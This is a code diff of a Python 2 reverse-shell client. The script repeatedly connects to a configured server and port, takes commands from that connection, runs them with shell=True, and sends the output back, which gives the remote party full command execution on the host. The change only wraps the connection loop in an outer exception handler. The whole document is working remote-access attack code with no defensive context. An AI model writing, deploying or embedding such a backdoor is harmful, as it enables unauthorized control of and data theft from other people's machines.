@@ -20,43 +20,46 @@ def send_error(errcmnd):
         s.send("No command '" + errcmnd + "' found,")
     
 def main():
-    while True:
-        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-            s.connect((_SERVER, _PORT))
-        except Exception, ex:
-            continue
-        s.send(str(os.getcwd()) + ">")
+    try:
         while True:
+            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             try:
-                data = s.recvfrom(65565)[0]
-                if data.strip():
-                    arg_list = map(str.strip, data.strip().split());
-                    if arg_list[0].lower() == 'cd' and len(arg_list) > 1:
-                        try:
-                            os.chdir(' '.join(arg_list[1:]))
-                            s.send(os.getcwd()+ ">")
-                            continue
-                        except OSError, ex:
-                            s.send(str(ex.strerror) + "\n" + os.getcwd()+ ">")
-                            continue
-                    if _MODE:
-                        arg_list.insert(0, _MODE)
-                    command = ' '.join(arg_list)
-                    try:
-                        out = subprocess.check_output(arg_list, shell=True)
-                        s.send(str(out) + os.getcwd() + ">")
-                    except subprocess.CalledProcessError as ex:
-                        send_error(arg_list[1])
-                        continue
-                else:
-                    s.send(os.getcwd()+ ">")
-            except socket.error, ex:
-                break
-            except KeyboardInterrupt, ex:
-                sys.exit()
+                s.connect((_SERVER, _PORT))
             except Exception, ex:
                 continue
+            s.send(str(os.getcwd()) + ">")
+            while True:
+                try:
+                    data = s.recvfrom(65565)[0]
+                    if data.strip():
+                        arg_list = map(str.strip, data.strip().split());
+                        if arg_list[0].lower() == 'cd' and len(arg_list) > 1:
+                            try:
+                                os.chdir(' '.join(arg_list[1:]))
+                                s.send(os.getcwd()+ ">")
+                                continue
+                            except OSError, ex:
+                                s.send(str(ex.strerror) + "\n" + os.getcwd()+ ">")
+                                continue
+                        if _MODE:
+                            arg_list.insert(0, _MODE)
+                        command = ' '.join(arg_list)
+                        try:
+                            out = subprocess.check_output(arg_list, shell=True)
+                            s.send(str(out) + os.getcwd() + ">")
+                        except subprocess.CalledProcessError as ex:
+                            send_error(arg_list[1])
+                            continue
+                    else:
+                        s.send(os.getcwd()+ ">")
+                except socket.error, ex:
+                    break
+                except KeyboardInterrupt, ex:
+                    sys.exit()
+                except Exception, ex:
+                    continue
+    except Exception, ex:
+        print(ex)
 
 if __name__ == '__main__':
     main()
